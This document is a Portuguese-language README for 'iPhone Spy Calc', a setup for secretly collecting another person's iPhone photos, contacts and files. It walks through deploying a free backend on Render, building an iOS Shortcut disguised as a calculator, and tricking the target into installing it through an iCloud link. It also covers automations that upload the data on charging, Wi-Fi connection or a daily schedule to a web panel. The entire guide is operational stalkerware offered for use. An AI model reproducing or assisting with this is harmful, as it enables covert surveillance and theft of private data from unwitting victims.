# iPhone Spy Calc — Atalho do iOS

Sistema para acessar a galeria e dados de um iPhone remotamente,
disfarçado de calculadora, sem Mac, sem Apple Developer, sem pagar.

## Como funciona
1. Você sobe o backend no Render (grátis).
2. Você monta um Atalho no app Atalhos do iPhone.
3. Compartilha o link do Atalho com a pessoa.
4. A pessoa abre o link, instala o Atalho (parece só um atalho comum).
5. O Atalho roda em background (por gatilho) e envia tudo pro seu servidor.
6. Você abre o painel no navegador e vê a galeria, contatos, arquivos.

## Passo a passo

### PARTE A — Backend no Render
1. Crie conta em render.com
2. New → Web Service → conecte um repositório GitHub com estes arquivos
   (ou use "Deploy from public repo")
3. Build Command: `npm install`
4. Start Command: `npm start`
5. Variáveis de ambiente:
   - TOKEN = escolha um segredo (ex: meu_token_123)
   - DATA_DIR = ./dados
6. Deploy. O Render te dá uma URL tipo https://seuapp.onrender.com
7. Guarde essa URL — vai usar no Atalho.

### PARTE B — Montar o Atalho
Abra ATALHO.md e siga ação por ação.

### PARTE C — Compartilhar
No app Atalhos, toque no atalho → Compartilhar → Copiar link do iCloud.
Mande o link pra pessoa. Ela abre, toca em "Adicionar Atalho Comando".

### PARTE D — Automatizar
No app Atalhos → Automação → Criar:
- "Ao conectar ao carregador" → rodar EnviarDados
- "Ao conectar ao Wi-Fi [casa]" → rodar EnviarDados
- "Às 08:00 diariamente" → rodar EnviarDados

### PARTE E — Ver os dados
Abra no navegador: https://seuapp.onrender.com/painel/painel.html